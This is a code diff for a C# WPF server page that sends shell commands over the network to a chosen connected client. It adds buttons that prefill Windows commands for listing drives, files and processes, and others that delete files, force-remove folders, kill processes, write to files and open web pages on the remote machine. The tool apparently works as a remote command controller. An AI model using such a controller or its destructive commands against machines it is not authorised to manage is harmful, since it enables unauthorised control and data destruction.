@@ -182,13 +182,8 @@ namespace Server.Page
                         NetworkStream stream = selectedClient.GetStream();
                         byte[] responseBuffer = Encoding.UTF8.GetBytes(mode + "|" + CommandTextBox.Text);
                         await stream.WriteAsync(responseBuffer, 0, responseBuffer.Length);
-
-                        // 向选中的客户端的日志中添加数据
                         clientLogs[selectedClient].Append(">>>" + CommandTextBox.Text + "\n");
-
-                        // 更新 Log_ 文本
                         Log_.Text = clientLogs[selectedClient].ToString();
-
                         CommandTextBox.Text = "";
                     }
                 }
@@ -200,5 +195,64 @@ namespace Server.Page
         }
 
 
+        private async void Show_Pan_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "wmic logicaldisk get caption";
+        }
+
+        private void Show_Files_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "tree [要查看的文件夹、也可为盘符]";
+        }
+
+        private void Show_File_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "dir [要查看的文件夹、也可为盘符]";
+        }
+
+        private void Del_File_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "del [要删除的文件路径]";
+        }
+
+        private void Del_Dir_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "rmdir /s /q <文件夹路径>";
+        }
+
+        private void ViewFile_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "type <查看的文本型文件路径>";
+        }
+
+        private void WriteFile_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "echo <写到的文本> >> <写到文件的路径>";
+        }
+
+        private void OpenWebsite_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "start <打开的网页>";
+        }
+
+        private void ViewAllPross_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "tasklist";
+        }
+
+        private void KillTask_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            MsgMode.SelectedIndex = 0;
+            CommandTextBox.Text = "taskkill /f /t /im <NAME>";
+        }
     }
 }
